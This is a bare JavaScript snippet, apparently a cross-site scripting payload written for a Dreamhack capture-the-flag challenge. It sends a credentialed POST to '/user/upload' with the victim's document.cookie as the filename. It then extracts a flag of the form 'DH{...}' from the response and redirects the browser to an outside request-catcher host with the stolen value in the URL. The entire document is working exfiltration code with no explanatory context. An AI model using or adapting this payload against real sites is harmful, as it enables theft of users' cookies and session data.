fetch("/user/upload", {
  method: 'POST',
  headers: {
    'Content-Type': 'application/x-www-form-urlencoded',                 
    'Accept': '*/*'
  },
  credentials: 'include',
  body: new URLSearchParams({
                'filename': document.cookie,    
                'data': 'test'
            })
}).then(response => {
    return response.text();
  }).then(flag => {
  location.href = "https://cbafxmy.request.dreamhack.games/?q="+/DH{.*}/.exec(flag);
});
